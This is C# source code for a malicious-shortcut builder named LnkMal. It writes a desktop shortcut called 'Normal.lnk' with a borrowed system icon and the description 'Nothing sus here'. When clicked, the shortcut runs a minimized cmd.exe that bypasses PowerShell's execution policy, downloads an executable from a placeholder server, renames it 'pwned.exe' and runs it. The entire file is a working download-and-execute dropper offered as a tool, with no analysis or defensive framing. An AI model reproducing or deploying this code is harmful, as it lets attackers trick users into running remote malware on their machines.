using IWshRuntimeLibrary;
using System.Runtime.InteropServices;

namespace LnkMal
{
    class Lnk
    {
        static void Main(string[] args)
        {
            //Get path to desktop
            var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var drop_path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var url = "\"http://SERVER:8000/normal\"";
            
            var vshell = new WshShell();
            var command = "powershell Set-ExecutionPolicy -Scope CurrentUser bypass & echo Invoke-WebRequest " + url + " -OutFile normal.exe; Rename-Item normal.exe pwned.exe; staRt-PRocesS pwned.exe > hello.ps1 & powershell.exe -File hello.ps1";
            //var shortcut_path = Path.Combine(path, @"\Accounting.lnk");
            var shortcut = (IWshShortcut)vshell.CreateShortcut(path + @"\Normal.lnk");
            shortcut.Description = "Nothing sus here";
            shortcut.IconLocation = @"C:\Windows\System32\shell32.dll,70";
            shortcut.TargetPath = "cmd.exe";
            shortcut.Arguments = "/c " + command;
            shortcut.WindowStyle = 7;
            shortcut.WorkingDirectory = drop_path;
            shortcut.Save();
            Console.WriteLine("[ + ] Icon created successfully");
            
        }
    }
}
